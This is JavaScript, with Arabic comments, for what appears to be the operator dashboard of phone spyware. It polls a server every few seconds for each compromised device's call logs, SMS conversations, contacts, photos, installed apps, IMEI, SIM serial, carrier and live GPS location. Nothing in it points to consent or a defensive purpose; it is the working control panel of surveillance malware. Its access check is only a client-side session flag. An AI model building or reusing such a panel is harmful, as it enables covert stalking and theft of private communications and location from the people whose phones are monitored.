// التحقق من تسجيل الدخول
if (sessionStorage.getItem('logged_in') !== 'true') {
    window.location.href = 'login.html';
}

let currentDevice = null;
let updateInterval = null;
let dataInterval = null;
let allCalls = [];
let allSMS = [];
let allContacts = [];

function logout() {
    sessionStorage.removeItem('logged_in');
    window.location.href = 'login.html';
}

// حذف الجهاز
async function deleteDevice() {
    if (!currentDevice) return;
    if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
    
    try {
        await fetch(`/api.php?action=delete_device&device=${currentDevice}`, { method: 'GET' });
        alert('تم حذف الجهاز');
        loadDevices();
        currentDevice = null;
        document.getElementById('deviceSelect').value = '';
    } catch (e) {
        alert('خطأ في الحذف');
    }
}

// تحميل الأجهزة
async function loadDevices() {
    try {
        const response = await fetch('/devices.json');
        const devices = await response.json();
        
        const select = document.getElementById('deviceSelect');
        const currentValue = currentDevice;
        select.innerHTML = '<option value="">اختر الجهاز...</option>';
        
        devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.id;
            select.appendChild(option);
        });
        
        if (currentValue) {
            select.value = currentValue;
        }
    } catch (e) {
        console.error('Devices error:', e);
    }
}

function selectDevice(deviceId) {
    currentDevice = deviceId;
    
    if (updateInterval) clearInterval(updateInterval);
    if (dataInterval) clearInterval(dataInterval);
    
    if (deviceId) {
        // تحديث الحالة كل 3 ثوانٍ
        updateInterval = setInterval(updateLiveData, 3000);
        
        // تحديث البيانات الكاملة كل 5 ثوانٍ
        dataInterval = setInterval(() => {
            if (currentDevice) {
                loadAllData();
            }
        }, 5000);
        
        updateLiveData();
        loadAllData();
    }
}

async function updateLiveData() {
    if (!currentDevice) return;
    
    try {
        const response = await fetch(`/live.php?device=${currentDevice}`);
        const data = await response.json();
        
        const statusEl = document.getElementById('networkStatus');
        if (data.online) {
            statusEl.textContent = data.network || 'متصل';
            statusEl.className = 'value online';
        } else {
            statusEl.textContent = 'غير متصل';
            statusEl.className = 'value offline';
        }
        
        if (data.location && data.location.latitude) {
            document.getElementById('locationStatus').textContent = 
                `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}`;
            document.getElementById('locationStatus').className = 'value online';
            showLocationDetails(data.location);
        }
        
        if (data.battery !== null && data.battery !== undefined) {
            document.getElementById('batteryStatus').textContent = data.battery + '%';
        }
        
        if (data.seconds_ago !== undefined) {
            const lastSeen = document.getElementById('lastSeen');
            if (data.seconds_ago < 10) lastSeen.textContent = 'الآن';
            else if (data.seconds_ago < 60) lastSeen.textContent = `${data.seconds_ago} ثانية`;
            else lastSeen.textContent = `${Math.floor(data.seconds_ago / 60)} دقيقة`;
        }
        
        if (data.call_count !== undefined) 
            document.getElementById('callCount').textContent = `(${data.call_count})`;
        if (data.sms_count !== undefined) 
            document.getElementById('smsCount').textContent = `(${data.sms_count})`;
        if (data.contacts_count !== undefined) 
            document.getElementById('contactsCount').textContent = `(${data.contacts_count})`;
        if (data.images_count !== undefined) 
            document.getElementById('imagesCount').textContent = `(${data.images_count})`;
        if (data.apps_count !== undefined) 
            document.getElementById('appsCount').textContent = `(${data.apps_count})`;
        
    } catch (e) {
        console.error('Live error:', e);
    }
}

async function loadAllData() {
    if (!currentDevice) return;
    await loadCalls();
    await loadSMS();
    await loadContacts();
    await loadApps();
    await loadDeviceInfo();
}

// ============ المكالمات ============
async function loadCalls() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=call_logs`);
        const newCalls = await response.json();
        
        // تحقق إذا تغيرت البيانات
        if (JSON.stringify(newCalls) !== JSON.stringify(allCalls)) {
            allCalls = newCalls;
            displayCalls(allCalls);
        }
    } catch (e) {}
}

function displayCalls(calls) {
    const tbody = document.querySelector('#callsTable tbody');
    tbody.innerHTML = '';
    
    if (!calls || calls.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#888;">لا توجد مكالمات</td></tr>';
        return;
    }
    
    calls.forEach(call => {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td><span class="clickable" onclick="openChat('${call.number || ''}')">${call.number || 'غير معروف'}</span></td>
            <td>${call.name || '—'}</td>
            <td><span class="call-type type-${call.type}">${getCallType(call.type)}</span></td>
            <td>${formatDuration(call.duration)}</td>
            <td>${formatDate(call.date)}</td>
        `;
        tbody.appendChild(row);
    });
}

function filterCalls() {
    const search = document.getElementById('callSearch').value.toLowerCase();
    const filtered = allCalls.filter(call => 
        (call.number || '').toLowerCase().includes(search) ||
        (call.name || '').toLowerCase().includes(search)
    );
    displayCalls(filtered);
}

// ============ الرسائل ============
async function loadSMS() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=sms`);
        const newSMS = await response.json();
        
        if (JSON.stringify(newSMS) !== JSON.stringify(allSMS)) {
            allSMS = newSMS;
            if (currentChat) {
                openChat(currentChat);
            } else {
                displayConversations();
            }
        }
    } catch (e) {}
}

function displayConversations() {
    const conversationsDiv = document.getElementById('conversationsList');
    const chatView = document.getElementById('chatView');
    chatView.style.display = 'none';
    conversationsDiv.style.display = 'block';
    
    conversationsDiv.innerHTML = '';
    
    if (!allSMS || allSMS.length === 0) {
        conversationsDiv.innerHTML = '<p style="color:#888;">لا توجد رسائل</p>';
        return;
    }
    
    const conversations = {};
    allSMS.forEach(sms => {
        const number = sms.address || 'غير معروف';
        if (!conversations[number]) {
            conversations[number] = [];
        }
        conversations[number].push(sms);
    });
    
    Object.keys(conversations).forEach(number => {
        const messages = conversations[number];
        const lastMessage = messages[messages.length - 1];
        
        const div = document.createElement('div');
        div.className = 'conversation-item';
        div.onclick = () => openChat(number);
        div.innerHTML = `
            <div class="conversation-avatar">💬</div>
            <div class="conversation-info">
                <div class="conversation-name">${number}</div>
                <div class="conversation-preview">${lastMessage.body || ''}</div>
            </div>
            <div class="conversation-time">${formatDate(lastMessage.date)}</div>
        `;
        conversationsDiv.appendChild(div);
    });
}

function openChat(number) {
    currentChat = number;
    document.getElementById('conversationsList').style.display = 'none';
    document.getElementById('chatView').style.display = 'block';
    document.getElementById('chatTitle').textContent = `💬 ${number}`;
    
    const messagesList = document.getElementById('messagesList');
    messagesList.innerHTML = '';
    
    const chatMessages = allSMS.filter(sms => sms.address === number);
    
    chatMessages.forEach(sms => {
        const div = document.createElement('div');
        div.className = `message ${sms.type == 1 ? 'incoming' : 'outgoing'}`;
        div.innerHTML = `
            <div class="message-bubble">
                <div class="message-text">${sms.body || ''}</div>
                <div class="message-time">${formatDate(sms.date)}</div>
            </div>
        `;
        messagesList.appendChild(div);
    });
    
    messagesList.scrollTop = messagesList.scrollHeight;
}

function backToConversations() {
    currentChat = null;
    displayConversations();
}

// ============ جهات الاتصال ============
async function loadContacts() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=contacts`);
        const newContacts = await response.json();
        
        if (JSON.stringify(newContacts) !== JSON.stringify(allContacts)) {
            allContacts = newContacts;
            displayContacts(allContacts);
        }
    } catch (e) {}
}

function displayContacts(contacts) {
    const tbody = document.querySelector('#contactsTable tbody');
    tbody.innerHTML = '';
    
    if (!contacts || contacts.length === 0) {
        tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:#888;">لا توجد جهات اتصال</td></tr>';
        return;
    }
    
    contacts.forEach(contact => {
        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
        const row = document.createElement('tr');
        row.innerHTML = `
            <td>${contact.name || 'بدون اسم'}</td>
            <td>${numbers.join(', ')}</td>
            <td>
                ${numbers.map(n => `<button class="action-btn" onclick="openChat('${n}')">💬</button>`).join(' ')}
            </td>
        `;
        tbody.appendChild(row);
    });
}

function filterContacts() {
    const search = document.getElementById('contactSearch').value.toLowerCase();
    const filtered = allContacts.filter(contact => 
        (contact.name || '').toLowerCase().includes(search) ||
        (Array.isArray(contact.numbers) ? contact.numbers.join(' ') : '').toLowerCase().includes(search)
    );
    displayContacts(filtered);
}

// ============ الصور ============
async function loadImages() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=images`);
        const images = await response.json();
        
        const grid = document.getElementById('imagesGrid');
        grid.innerHTML = '';
        
        if (!images || images.length === 0) {
            grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>';
            return;
        }
        
        images.forEach((image, index) => {
            const div = document.createElement('div');
            div.className = 'image-item';
            
            const img = document.createElement('img');
            img.src = image.path || '';
            img.className = 'thumb';
            img.alt = image.name || `صورة ${index + 1}`;
            img.onerror = function() {
                this.style.display = 'none';
                this.parentElement.innerHTML = '<div class="no-image">📷 صورة غير متاحة</div>';
            };
            img.onclick = () => window.open(img.src, '_blank');
            
            const name = document.createElement('div');
            name.className = 'image-name';
            name.textContent = image.name || `صورة ${index + 1}`;
            
            div.appendChild(img);
            div.appendChild(name);
            grid.appendChild(div);
        });
    } catch (e) {
        console.error('Images error:', e);
    }
}

// ============ التطبيقات ============
async function loadApps() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=installed_apps`);
        const apps = await response.json();
        
        const tbody = document.querySelector('#appsTable tbody');
        tbody.innerHTML = '';
        
        if (!apps || apps.length === 0) {
            tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:#888;">لا توجد تطبيقات</td></tr>';
            return;
        }
        
        apps.forEach(app => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${app.name || app.package || ''}</td>
                <td>${app.package || ''}</td>
                <td>${app.system_app ? 'نعم' : 'لا'}</td>
            `;
            tbody.appendChild(row);
        });
    } catch (e) {}
}

// ============ معلومات الجهاز ============
async function loadDeviceInfo() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=device_info`);
        const info = await response.json();
        
        const div = document.getElementById('deviceInfo');
        
        if (!info || Object.keys(info).length === 0) {
            div.innerHTML = '<p style="color:#888;">لا توجد معلومات</p>';
            return;
        }
        
        div.innerHTML = `
            <div class="device-info-grid">
                <div class="info-card"><span>الموديل:</span><strong>${info.model || '—'}</strong></div>
                <div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div>
                <div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div>
                <div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div>
                <div class="info-card"><span>الرقم التسلسلي:</span><strong>${info.sim_serial || '—'}</strong></div>
                <div class="info-card"><span>الناقل:</span><strong>${info.carrier || '—'}</strong></div>
                <div class="info-card"><span>الذاكرة:</span><strong>${formatBytes(info.total_ram)}</strong></div>
                <div class="info-card"><span>المساحة الحرة:</span><strong>${formatBytes(info.free_storage)}</strong></div>
            </div>
        `;
    } catch (e) {}
}

// ============ الموقع ============
function showLocationDetails(location) {
    const div = document.getElementById('locationDetails');
    if (location && location.latitude) {
        div.innerHTML = `
            <p>📍 خط العرض: ${location.latitude.toFixed(6)}</p>
            <p>📍 خط الطول: ${location.longitude.toFixed(6)}</p>
            <p>📏 الدقة: ${location.accuracy ? location.accuracy + ' متر' : '—'}</p>
            <p>🚗 السرعة: ${location.speed ? location.speed + ' م/ث' : '—'}</p>
        `;
    }
}

// ============ دوال مساعدة ============
function switchTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    
    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
    if (tab) tab.classList.add('active');
    
    const pane = document.getElementById(`${tabName}Tab`);
    if (pane) pane.classList.add('active');
}

function formatDuration(seconds) {
    if (!seconds || seconds < 0) return '0:00';
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
}

function formatDate(timestamp) {
    if (!timestamp) return '—';
    try {
        return new Date(timestamp).toLocaleString('ar');
    } catch (e) {
        return '—';
    }
}

function formatBytes(bytes) {
    if (!bytes || bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function getCallType(type) {
    switch(parseInt(type)) {
        case 1: return '📥 وارد';
        case 2: return '📤 صادر';
        case 3: return '❌ فائت';
        default: return 'غير معروف';
    }
}

// تحميل الأجهزة عند الفتح
loadDevices();
setInterval(loadDevices, 10000);
